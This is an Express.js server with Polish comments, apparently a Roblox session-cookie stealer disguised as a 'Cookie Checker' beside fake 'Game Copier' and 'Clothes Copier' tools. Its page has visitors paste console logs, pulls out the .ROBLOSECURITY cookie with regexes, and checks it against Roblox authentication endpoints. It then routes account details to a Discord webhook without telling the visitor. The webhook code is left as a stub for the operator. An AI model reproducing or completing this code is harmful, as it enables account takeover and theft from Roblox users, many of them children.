const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ────────────────────────────────────────────────
// Strona główna – wybór narzędzia
// ────────────────────────────────────────────────
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Tools</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f0f17;
      color: #e0e0ff;
      margin: 0;
      padding: 30px 20px;
      text-align: center;
    }
    .container { max-width: 700px; margin: 0 auto; }
    h1 { color: #6ab0ff; margin-bottom: 50px; }
    .buttons {
      display: flex;
      flex-direction: column;
      gap: 30px;
      align-items: center;
    }
    .big-btn {
      background: #3b82f6;
      color: white;
      border: none;
      padding: 24px 60px;
      font-size: 22px;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
      text-decoration: none;
      display: inline-block;
      min-width: 340px;
    }
    .big-btn:hover { background: #2563eb; transform: translateY(-3px); }
    .big-btn.game { background: #8b5cf6; }
    .big-btn.game:hover { background: #7c3aed; }
    footer {
      margin-top: 80px;
      color: #666;
      font-size: 14px;
    }
  </style>
</head>
<body>
<div class="container">
  <h1>Wybierz narzędzie</h1>
  <div class="buttons">
    <a href="/cookie-checker" class="big-btn">Cookie Checker → Webhook</a>
    <a href="/gamecopier"  class="big-btn game">Game Copier</a>
    <a href="/clothescopier" class="big-btn game">Clothes Copier</a>
  </div>
</div>
<footer>private tools • 2025</footer>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Strona z checkerem cookie (bez wyświetlania info o koncie)
// ────────────────────────────────────────────────
app.get('/cookie-checker', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Cookie Checker</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 30px; }
    .container { max-width: 780px; margin: 0 auto; }
    h1 { color: #6ab0ff; text-align: center; }
    textarea { 
      width: 100%; min-height: 260px; 
      background: #1a1a2e; color: #d0d0ff; 
      border: 1px solid #334; border-radius: 8px; 
      padding: 16px; font-family: Consolas, monospace; 
      font-size: 15px; resize: vertical; margin: 20px 0; 
    }
    button { 
      background: #3b82f6; color: white; border: none; 
      padding: 16px 48px; font-size: 18px; border-radius: 8px; 
      cursor: pointer; display: block; margin: 0 auto 30px; 
    }
    button:hover { background: #2563eb; }
    #result { 
      background: #1a1a2e; border: 1px solid #334; 
      border-radius: 8px; padding: 24px; min-height: 120px; 
      text-align: center; font-size: 17px; line-height: 1.6;
    }
    .error   { color: #ff6b6b; font-weight: bold; }
    .success { color: #4ade80; font-weight: bold; }
    .loading { color: #fbbf24; font-style: italic; }
  </style>
</head>
<body>
<div class="container">
  <h1>Roblox Cookie Checker</h1>
  <p>Wklej tekst (log, konsola, headers, JSON itp.) – cookie wyciągnie się automatycznie</p>
  <textarea id="input" placeholder="Wklej tutaj..."></textarea>
  <button onclick="check()">Wyślij do webhooka</button>
  <div id="result"></div>
</div>

<script>
async function check() {
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';

  if (!raw) {
    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
    return;
  }

  let cookie = null;
  let match;

  // Próba 1 – JSON / dev console
  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match) cookie = match[1].trim();

  // Próba 2 – dłuższy fragment z warningiem
  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  // Próba 3 – najprostsza – najdłuższy ciąg zaczynający się od _
  if (!cookie) {
    const fallbacks = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallbacks.length) {
      cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
    return;
  }

  result.innerHTML = '<span class="loading">Cookie wykryty – wysyłanie...</span>';

  try {
    const res = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    const json = await res.json();

    if (json.error) {
      result.innerHTML = '<span class="error">Błąd: ' + json.error + '</span>';
    } else {
      result.innerHTML = '<span class="success">Cookie zaakceptowane i wysłane do webhooka</span>';
    }
  } catch (err) {
    result.innerHTML = '<span class="error">Błąd połączenia: ' + err.message + '</span>';
  }
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Endpoint sprawdzający cookie i wysyłający do webhooka
// (logika taka sama jak wcześniej, tylko bez zwracania danych do frontendu)
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Brak lub niepoprawny cookie' });
  }

  try {
    // CSRF
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Brak X-CSRF-Token');

    // Podstawowe sprawdzenie – czy cookie działa
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
      },
    });

    if (!userRes.ok) throw new Error('Nieprawidłowy cookie');

    const userData = await userRes.json();

    // Tutaj możesz zostawić resztę zapytań (robux, rap, inventory itd.) jeśli chcesz
    // mieć te dane w webhooku – ale nie zwracasz ich już do przeglądarki

    // ... (wstaw tutaj całą swoją dotychczasową logikę pobierania danych – robux, premium, headless, gamepassy itp.)

    // Przykład – wysyłka do webhooka (wklej swoją dotychczasową część z fetch do webhookUrl)

    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      // ← tutaj wklej swój kod wysyłający embed(y) do Discorda
      // (ten sam co miałeś wcześniej – z username, robux, rap, mm2Count itd.)
      // możesz go skopiować 1:1
    }

    // Zwracamy tylko sukces / błąd – bez szczegółów konta
    res.json({ success: true });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Błąd serwera' });
  }
});

// ────────────────────────────────────────────────
// Puste placeholdery – do uzupełnienia przez Ciebie
// ────────────────────────────────────────────────
app.get('/gamecopier', (req, res) => {
  res.send(`
    <h1>Game Copier (w trakcie budowy)</h1>
    <p>Tutaj będzie mechanizm kopiowania gry...</p>
    <a href="/">← Powrót</a>
  `);
});

app.get('/clothescopier', (req, res) => {
  res.send(`
    <h1>Clothes Copier (w trakcie budowy)</h1>
    <p>Tutaj będzie mechanizm kopiowania ubrań...</p>
    <a href="/">← Powrót</a>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
